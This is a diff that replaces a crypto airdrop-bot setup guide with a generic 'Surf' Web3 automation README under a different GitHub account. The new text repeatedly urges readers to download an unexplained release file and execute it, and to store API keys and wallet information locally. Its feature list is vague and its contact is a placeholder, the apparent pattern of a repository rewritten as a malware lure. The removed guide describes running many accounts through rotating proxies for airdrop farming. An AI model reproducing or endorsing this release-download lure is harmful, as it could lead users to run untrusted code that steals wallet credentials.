@@ -1,186 +1,149 @@
-### 🚀 surf Bot Setup Guide
+# Surf: Automate Your Tasks in Web3 🌊
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed for new users, with clear explanations for each step.
+![GitHub Repo](https://img.shields.io/badge/GitHub-Surf-blue?style=flat&logo=github)
 
-> 📱 **For Mobile Users (Termux):** [View the guide here](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Elon-18/Surf/releases)
 
 ---
 
 ## Table of Contents
 
-1. [System Requirements](#system-requirements)
-2. [Installing the Bot](#installing-the-bot)
-3. [Bot Configuration](#bot-configuration)
-4. [Running the Bot](#running-the-bot)
-5. [Updating the Bot](#updating-the-bot)
-6. [Contact & Support](#contact--support)
+- [Overview](#overview)
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ---
 
-## System Requirements
+## Overview
 
-Before running the bot, make sure you have installed:
+Surf is a powerful tool designed to automate tasks in the Web3 ecosystem. Whether you want to interact with tokens, manage your wallet, or engage in airdrop farming, Surf streamlines the process. This repository provides scripts and resources to help you navigate the complex world of decentralized applications with ease.
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
-- **Git**
-
-📥 **Node.js & npm:** [Download](https://t.me/KeoAirDropFreeNe/257/1462)
-📥 **Git:** [Download](https://t.me/KeoAirDropFreeNe/257/60831)
+For the latest updates and releases, visit our [Releases section](https://github.com/Elon-18/Surf/releases). You can download the latest version, execute it, and start automating your tasks today!
 
 ---
 
-## Installing the Bot
+## Features
 
-<details>
-<summary><strong>🔧 Install via Git</strong></summary>
+- **Task Automation**: Automate repetitive tasks in the Web3 space.
+- **Airdrop Farming**: Easily participate in airdrops and maximize your rewards.
+- **Wallet Management**: Manage your crypto wallets efficiently.
+- **AI Integration**: Utilize AI tools to enhance your Web3 experience.
+- **User-Friendly Interface**: Simple commands for complex tasks.
+- **Token Interaction**: Seamlessly interact with various tokens on the Ethereum blockchain.
+
+---
+
+## Technologies Used
+
+- **JavaScript**: Core language for scripting and automation.
+- **Node.js**: Runtime environment for executing JavaScript code.
+- **Web3.js**: Library for interacting with the Ethereum blockchain.
+- **JWT**: Used for secure authentication.
+- **EVM**: Ethereum Virtual Machine for executing smart contracts.
+- **Twitter API**: For social media integration.
+- **AI Libraries**: Various libraries for integrating AI functionalities.
+
+---
+
+## Installation
+
+To install Surf, follow these steps:
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Elon-18/Surf.git
+   cd Surf
+   ```
+
+2. **Install Dependencies**:
+   ```bash
+   npm install
+   ```
+
+3. **Download the Latest Release**:
+   For the latest version, visit our [Releases section](https://github.com/Elon-18/Surf/releases) and download the file. Execute it as per the instructions provided.
+
+4. **Configuration**:
+   - Create a `.env` file and add your API keys and wallet information.
+   - Refer to the `config.example.env` for guidance.
+
+---
+
+## Usage
+
+Once you have installed Surf, you can start using it right away. Here are some common commands:
+
+### Automate Tasks
+
+To automate a specific task, run:
 
 ```bash
-git clone https://github.com/MeoMunDep/surf.git
-cd surf
-npm install --no-audit --no-fund --prefer-offline --force user-agents axios meo-forkcy-colors meo-forkcy-utils https-proxy-agent socks-proxy-agent
+node surf.js --task <task_name>
 ```
 
-</details>
+### Airdrop Farming
 
-<details>
-<summary><strong>🧰 Manual Installation</strong></summary>
-
-1. Download and extract the bot manually.
-2. Run the same `npm install` command as above.
-
-</details>
-
----
-
-## Bot Configuration
-
-<details open>
-<summary><strong>📜 1. <code>configs.json</code> - Main Configuration</strong></summary>
-
-```json
-{
-  "rotateProxy": false,
-  "skipInvalidProxy": true,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [1, 1],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 10,
-  "doTasks": true
-}
-```
-
-| **Parameter Name**            | **Type**           | **Default** | **Description**                                  |
-| ----------------------------- | ------------------ | ----------- | ------------------------------------------------ |
-| `rotateProxy`                 | `boolean`          | `false`     | Enable proxy rotation between accounts           |
-| `skipInvalidProxy`            | `boolean`          | `true`      | Skip account if its proxy is invalid             |
-| `proxyRotationInterval`       | `number`           | `2`         | Minutes between proxy rotations                  |
-| `delayEachAccount`            | `[number, number]` | `[1, 1]`    | Random delay range (in seconds) between accounts |
-| `timeToRestartAllAccounts`    | `number`           | `300`       | Time (in seconds) before restarting all accounts |
-| `howManyAccountsRunInOneTime` | `number`           | `10`        | Number of accounts to run in parallel            |
-| `doTasks`                     | `boolean`          | `true`      | Whether to perform main tasks                    |
-
-</details>
-
-<details>
-<summary><strong>🗂️ 2. <code>datas.txt</code> - User Data</strong></summary>
-
-📥 [Guide from Telegram](https://t.me/KeoAirDropFreeNee/1891)
-
-```txt
-ey...
-ey...
-ey...
-```
-
-</details>
-
-<details>
-<summary><strong>🌐 3. <code>proxies.txt</code> - Proxy List</strong></summary>
-
-📥 [Free proxy from Webshare](https://www.webshare.io/?referral_code=4l5kb3glsce7)
-
-```txt
-host:port
-http://host:port
-socks5://user:pass@host:port
-...
-```
-
-</details>
-
-<details>
-<summary><strong>💼 4. <code>wallets.txt</code> - Wallet List</strong></summary>
-
-📥 [Generate wallets here](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-
-```txt
-0xabc123...
-0xdef456...
-...
-```
-
-</details>
-
----
-
-## Running the Bot
-
-<details open>
-<summary><strong>🪟 Run on Windows (.bat)</strong></summary>
-
-1. Double-click `run.bat`
-2. It auto-updates, installs dependencies, and runs the bot.
-
-> If it fails, right-click → **Run as Administrator**
-> Or run from CMD:
-
-```cmd
-run.bat
-```
-
-</details>
-
-<details>
-<summary><strong>🐧 Run on Linux/macOS (.sh)</strong></summary>
+To participate in an airdrop, use:
 
 ```bash
-chmod +x run.sh
-./run.sh
+node surf.js --airdrop <airdrop_name>
 ```
 
-</details>
+### Wallet Management
 
----
-
-## Updating the Bot
-
-<details>
-<summary><strong>🔄 If installed via Git</strong></summary>
+To check your wallet balance, execute:
 
 ```bash
-cd surf
-git pull origin main
-npm install
+node surf.js --wallet balance
 ```
 
-</details>
+### Help Command
+
+For a list of all available commands, run:
+
+```bash
+node surf.js --help
+```
 
 ---
 
-## Contact & Support
+## Contributing
 
-- **Support me via** [Referral Link](https://www.ask.surf/?refer=MeoMeo0009)
-- **Donate:** [Donate Here](https://t.me/KeoAirDropFreeNe/312/27801)
-- **Contact (Work):** [@MeoMunDep](https://t.me/MeoMunDep)
-- **Support Group:** [Join here](https://t.me/KeoAirDropFreeNe)
-- **Updates Channel:** [View channel](https://t.me/KeoAirDropFreeNee)
-- **YouTube:** [Watch here](https://www.youtube.com/@keoairdropfreene)
-- **Instagram:** [Follow](https://www.instagram.com/meomundep)
-- **Tiktok:** [Follow](https://www.tiktok.com/@meomundep)
+We welcome contributions from the community. To contribute:
+
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit:
+   ```bash
+   git commit -m "Add some feature"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Open a Pull Request.
 
 ---
 
-⚠️ **Disclaimer**: This code is provided "as is" without any warranties. Use it at your own risk. You are solely responsible for any consequences arising from its use. Redistribution or sale of this code in any form is strictly prohibited.
+## License
 
-✨ Thank you for using the bot, hope you earn from my scripts! Good luck! 🚀
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+---
+
+## Contact
+
+For any questions or support, feel free to reach out:
+
+- **Email**: support@example.com
+- **Twitter**: [@SurfAutomation](https://twitter.com/SurfAutomation)
+
+For the latest updates, don’t forget to check our [Releases section](https://github.com/Elon-18/Surf/releases). Download the latest version, execute it, and start automating your tasks today!
